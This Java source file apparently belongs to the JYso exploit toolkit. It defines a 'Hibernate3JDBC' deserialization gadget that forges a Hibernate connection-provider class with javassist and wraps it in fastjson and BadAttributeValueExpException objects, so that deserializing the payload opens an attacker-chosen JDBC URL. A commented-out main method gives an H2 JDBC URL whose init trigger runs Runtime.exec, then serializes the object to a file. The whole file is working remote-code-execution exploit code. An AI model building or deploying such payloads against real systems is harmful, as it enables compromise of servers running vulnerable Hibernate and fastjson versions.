package com.qi4l.JYso.gadgets;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import com.alibaba.fastjson.JSONArray;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;

import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;

@Dependencies({" org.hibernate.hibernate-core:hibernate-core <= 4.1.12.Fina","com.alibaba.fastjson:com.alibaba.fastjson 1.X"})
@Authors({Authors.Unam4})
public class Hibernate3JDBC implements ObjectPayload<Object>, DynamicDependencies {
    @Override
    public Object getObject(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass driverconimpl = pool.makeClass("org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl");
        CtClass serializable = pool.get("java.io.Serializable");
        driverconimpl.addInterface(serializable);
        insertField(driverconimpl, "serialVersionUID", "private static final long serialVersionUID = -3339733132699493320L;");
        insertField(driverconimpl, "url", "private String url;");
        insertField(driverconimpl, "poolSize", "private int poolSize;");
        insertField(driverconimpl, "pool", "private java.util.ArrayList pool = new java.util.ArrayList();");


        CtMethod make = CtMethod.make(
                "public void configure(java.util.Map configurationValues) { " +
                        "this.url = (String) configurationValues.get(\"hibernate.connection.url\");" +
                        "this.poolSize = Integer.parseInt((String) configurationValues.get(\"hibernate.connection.pool_size\"));" +
                        "this.pool = new java.util.ArrayList();" +
                        "}", driverconimpl);
        driverconimpl.addMethod(make);


        Class<?> clazz = driverconimpl.toClass();
        Object o1 = clazz.newInstance();
        HashMap<Object, Object> map1 = new HashMap<>();
        map1.put("hibernate.connection.url", command);
        map1.put("hibernate.connection.pool_size", "0");

        clazz.getMethod("configure", Map.class).invoke(o1, map1);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o1);

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(o1, val);
        return hashMap;
    }

//    public static void main(String[] args) throws Exception{
//        Hibernate3JDBC hibernate3JDBC = new Hibernate3JDBC();
//        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
//                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
//                "java.lang.Runtime.getRuntime().exec('open .')\n" +
//                "$$\n";
//        Object object = hibernate3JDBC.getObject(JDBC_URL);
//        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./c3p0"));
//        outputStream.writeObject(object);
//        outputStream.close();
//
//    }
}
